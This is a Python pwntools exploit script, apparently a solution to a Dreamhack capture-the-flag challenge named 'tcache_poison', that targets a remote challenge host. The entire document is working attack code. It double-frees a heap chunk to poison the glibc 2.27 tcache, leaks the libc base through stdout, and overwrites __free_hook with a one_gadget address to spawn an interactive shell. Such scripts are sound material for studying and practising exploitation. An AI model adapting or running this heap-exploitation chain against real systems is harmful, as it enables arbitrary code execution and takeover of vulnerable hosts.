#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_poison_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host1.dreamhack.games", 14413)

    return r

r = conn()

def allocate(size, data):
    r.sendlineafter(b"\n", b"1")
    r.sendlineafter(b": ", str(size).encode())
    r.sendafter(b": ", data)

def free():
    r.sendlineafter(b"\n", b"2")

def print_chunk():
    r.sendlineafter(b"\n", b"3")

def edit(data):
    r.sendlineafter(b"\n", b"4")
    r.sendafter(b": ", data)

def main():
    allocate(64, b"A")
    free()

    edit(b"A" * 9)
    free()

    stdout = exe.symbols["stdout"]
    allocate(64, p64(stdout))

    allocate(64, b"A")

    io_2_1_stdout_lsb = p64(libc.symbols["_IO_2_1_stdout_"])[0:1]
    allocate(64, io_2_1_stdout_lsb)

    print_chunk()
    r.recvuntil(b": ")
    io_2_1_stdout = r.recvn(6).ljust(8, b"\x00")

    libc_base = u64(io_2_1_stdout) - libc.symbols["_IO_2_1_stdout_"]
    __free_hook = libc_base + libc.symbols["__free_hook"]
    one_gadgets = [0x4f3ce, 0x4f3d5, 0x4f432, 0x10a41c]
    
    allocate(128, b"A")
    free()

    edit(b"A" * 9)
    free()

    allocate(128, p64(__free_hook))

    allocate(128, b"A")

    allocate(128, p64(libc_base + one_gadgets[2]))

    free()

    r.interactive()


if __name__ == "__main__":
    main()
